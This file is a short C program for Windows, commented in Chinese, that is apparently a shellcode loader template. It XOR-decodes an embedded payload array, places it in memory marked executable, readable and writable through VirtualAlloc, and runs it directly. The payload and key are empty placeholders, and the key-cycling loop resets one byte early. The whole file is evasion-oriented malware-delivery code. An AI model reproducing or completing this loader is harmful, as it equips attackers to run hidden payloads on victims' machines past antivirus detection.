#include <Windows.h>
#include <stdio.h>


void XOR(char* data, size_t data_len, char* key, size_t key_len) {
    int j;
    j = 0;
    // 取payload中的每一位
    for (int i = 0; i < data_len; i++) {
        // 当key长度小于payload长度时，重复使用key值(之前python代码是通过取余实现)
        if (j == key_len - 1) j = 0;

        // 异或计算
        data[i] = data[i] ^ key[j];
        j++;
    }
}
int main()
{
    void* exec_mem;
    unsigned char xpp[] = { };
    unsigned int payload_len = sizeof(xpp);
    unsigned char key[] = "";
    unsigned int key_len = sizeof(key);


    XOR ((char*)xpp, payload_len, (char*)key, key_len);

    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    RtlMoveMemory(exec_mem, xpp, payload_len);

    ((void(*)())exec_mem)();

    return 0;
}
